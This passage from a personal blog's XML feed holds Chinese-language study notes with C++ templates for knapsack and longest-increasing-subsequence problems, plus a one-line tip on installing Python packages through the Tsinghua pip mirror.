operator">&lt;=</span>s1<span class="token punctuation">)</span><span class="token punctuation">{</span>            v<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token operator">=</span>k<span class="token operator">*</span>v1<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//二进制打包优化</span>            w<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token operator">=</span>w1<span class="token operator">*</span>k<span class="token punctuation">;</span>            s1<span class="token operator">-</span><span class="token operator">=</span>k<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里不要忘了减，因为假如有s1个的话，二进制处理的部分不能超过s1，比如s1=200，那么1，2，4，...，64,我们需要看一下当前的位数能构成的最大数的多少，二进制每一位有两种选择</span>            k<span class="token operator">*</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            cnt<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//处理剩余的部分，2^k不能大于s1</span>            v<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token operator">=</span>s1<span class="token operator">*</span>v1<span class="token punctuation">;</span>            w<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token operator">=</span>s1<span class="token operator">*</span>w1<span class="token punctuation">;</span>            cnt<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>cnt<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//按照01背包处理即可</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span>j<span class="token operator">&gt;=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//通过二进制优化，可以将中间O(s1)的复杂度优化到O(logs1),非常神奇</span></code></pre><h2 id="四-分组背包问题-一维的和01背包基本相同"><a href="#四-分组背包问题-一维的和01背包基本相同" class="headerlink" title="四.分组背包问题(一维的和01背包基本相同)"></a>四.分组背包问题(一维的和01背包基本相同)</h2><h3 id="一-模型含义-2"><a href="#一-模型含义-2" class="headerlink" title="一.模型含义"></a>一.模型含义</h3><p>一组有多个物品,每组只能选一个,求总体积不超过V的最大价值  </p><h3 id="二-代码模板"><a href="#二-代码模板" class="headerlink" title="二.代码模板"></a>二.代码模板</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">//混合背包问题一维模板(每组只能选一个，求不超过V的最大价值) </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">110</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此时f[i]表示体积不超过j的最大价值 </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>V<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cin<span class="token operator">&gt;&gt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         cin<span class="token operator">&gt;&gt;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输入每组数据 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span>j<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//只能选一个所以从大到小</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">&lt;=</span>j<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//因为j是&gt;=0所以这里要给个特判防止越界 </span>                f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清华pip镜像</title>
      <link href="/2020/08/06/qing-hua-pip-jing-xiang/"/>
      <url>/2020/08/06/qing-hua-pip-jing-xiang/</url>
      
        <content type="html"><![CDATA[<p>pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a> xxx<br>xxx表示的是第三方库的名字</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 第三方工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三方工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>opencv入门学习(正在更新)</title>
      <link href="/2020/08/05/opencv-ru-men-xue-xi-zheng-zai-geng-xin/"/>
      <url>/2020/08/05/opencv-ru-men-xue-xi-zheng-zai-geng-xin/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> opencv </category>
          
          <category> 人脸识别 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人脸识别 </tag>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最长上升子序列基础模型</title>
      <link href="/2020/08/04/zui-chang-shang-sheng-zi-xu-lie-mo-xing/"/>
      <url>/2020/08/04/zui-chang-shang-sheng-zi-xu-lie-mo-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="一-最长上升子序列问题定义"><a href="#一-最长上升子序列问题定义" class="headerlink" title="一.最长上升子序列问题定义"></a>一.最长上升子序列问题定义</h2><p><strong><em>如字面含义,对于a1,a2,a3,a4…,求出最长的递增的序列,递减的序列反向就相当于递增</em></strong></p><hr><h2 id="二-最长上升子序列代码模板"><a href="#二-最长上升子序列代码模板" class="headerlink" title="二.最长上升子序列代码模板"></a>二.最长上升子序列代码模板</h2><p>注：下面的代码是默认两个相同高度的平台之间不能跳跃,具体看if判断里面是否有等于号,如果是求最长下降子序列,那就把大于号换成小于号</p><h3 id="1-朴素版O-n-2"><a href="#1-朴素版O-n-2" class="headerlink" title="1.朴素版O(n^2)"></a>1.朴素版O(n^2)</h3><pre class=" language-cpp"><code class="language-cpp">    <span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span>    <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span>        cin<span class="token operator">>></span>n<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span> ans<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//起始点要算进去所以要+1</span>    <span class="token punctuation">}</span></code></pre><h3 id="2-进阶版-nlogn-默认数据非负数"><a href="#2-进阶版-nlogn-默认数据非负数" class="headerlink" title="2.进阶版(nlogn)(默认数据非负数)"></a>2.进阶版(nlogn)(默认数据非负数)</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">101000</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>g<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//此处输入的都是非负数</span>    q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">2e9</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> l<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>r<span class="token operator">=</span>ans<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> mid<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下面是l=mid,所以这里要+1</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>q<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span>l<span class="token operator">=</span>mid<span class="token punctuation">;</span>            <span class="token keyword">else</span> r<span class="token operator">=</span>mid<span class="token number">-1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//根据两段性：q[r]是&lt;a[i]的最大的数,所以q[r+1]>=a[i],用a[i]代替原来的值更好(或者是重新创建一个新的子序列)</span>        q<span class="token punctuation">[</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>ans<span class="token operator">&lt;&lt;</span><span class="token string">'\n'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><hr><h2 id="三-由最长上升子序列延伸出来的问题-案例"><a href="#三-由最长上升子序列延伸出来的问题-案例" class="headerlink" title="三.由最长上升子序列延伸出来的问题+案例"></a>三.由最长上升子序列延伸出来的问题+案例</h2><h3 id="1-求先递增再递减的最长序列"><a href="#1-求先递增再递减的最长序列" class="headerlink" title="1.求先递增再递减的最长序列"></a>1.求先递增再递减的最长序列</h3><p>登山：<a href="https://www.acwing.com/problem/content/1016/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/1016/</a>  </p><h4 id="1-1题意分析："><a href="#1-1题意分析：" class="headerlink" title="1.1题意分析："></a>1.1题意分析：</h4><p>由于要求的是严格先递增再递减的序列的最大长度,所以我们一定要找到那个极值点,找到极值点后唯一答案便确定了。所以,用若up[i]表示到i点的最长上升子序列,down[i]表示从i到n的最长下降子序列,只要循环求出最大的up[i]+down[i]即可   </p><p><strong><em>注意 :求down[i]的时候循环一定要逆向不能正向,因为下标大的down[i]是后更新的</em></strong>  </p><h4 id="1-2-AC代码："><a href="#1-2-AC代码：" class="headerlink" title="1.2 AC代码："></a>1.2 AC代码：</h4><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> up<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>down<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>h<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>h<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                up<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>up<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>up<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>n<span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//这里一定要倒着求注意dp值的更新必须用到已更新的dp值    </span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>h<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                down<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>down<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>down<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>up<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>down<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="2-最大上升子序列和"><a href="#2-最大上升子序列和" class="headerlink" title="2.最大上升子序列和"></a>2.最大上升子序列和</h3><h4 id="2-1-定义-求所有上升子序列中和最大的子序列和"><a href="#2-1-定义-求所有上升子序列中和最大的子序列和" class="headerlink" title="2.1 定义 :求所有上升子序列中和最大的子序列和"></a>2.1 定义 :求所有上升子序列中和最大的子序列和</h4><p>最大上升子序列和:<a href="https://www.acwing.com/problem/content/1018/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/1018/</a></p><h4 id="2-2-题意分析"><a href="#2-2-题意分析" class="headerlink" title="2.2 题意分析 :"></a>2.2 题意分析 :</h4><p>用dp[i]表示到点时的最大子序列和,但是由于可能出现负数,所以当满足递增子序列的情况下,有转移和转移两种选择,故状态转移方程为 ：dp[i]=max(dp[i],dp[j]+a[i])</p><h4 id="2-3-AC代码"><a href="#2-3-AC代码" class="headerlink" title="2.3 AC代码 :"></a>2.3 AC代码 :</h4><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h3 id="3-最小下降自序列-可相等-个数覆盖整个序列"><a href="#3-最小下降自序列-可相等-个数覆盖整个序列" class="headerlink" title="3.最小下降自序列(可相等)个数覆盖整个序列"></a>3.最小下降自序列(可相等)个数覆盖整个序列</h3><h4 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1. 定义 :"></a>3.1. 定义 :</h4><p> 用最少个数的不上升子序列的个数覆盖整个序列</p><h4 id="3-2-拦截导弹https-www-acwing-com-problem-content-1012"><a href="#3-2-拦截导弹https-www-acwing-com-problem-content-1012" class="headerlink" title="3.2 拦截导弹https://www.acwing.com/problem/content/1012/"></a>3.2 拦截导弹<a href="https://www.acwing.com/problem/content/1012/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/1012/</a></h4><h4 id="3-3-解法分析"><a href="#3-3-解法分析" class="headerlink" title="3.3 解法分析"></a>3.3 解法分析</h4><p>1.用g数组来维护每个子序列的末尾值(即最小值)且严格满足单调递增(稍微模拟理解一下就知道了)<br>2.然后对于每个a[i],从到到尾扫描g数组，看看当前创建的子序列的末尾值是否大于a[i] <strong><em>(我们的目的是通过贪心,让a[i]插到末尾值最小的序列当中去)</em></strong><br>3.<br>如果大于就肯定是最小的大于a[i],直接退出循环,否则就一个搜索到尽头,这个时候如果k&gt;=cnt(严格来说就是等于),那么就重新开一个子序列,否则的用更小的数代替当前子序列的末尾数g[i]</p><h4 id="3-4-AC代码-数据都是非负数"><a href="#3-4-AC代码-数据都是非负数" class="headerlink" title="3.4 AC代码(数据都是非负数)"></a>3.4 AC代码(数据都是非负数)</h4><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> 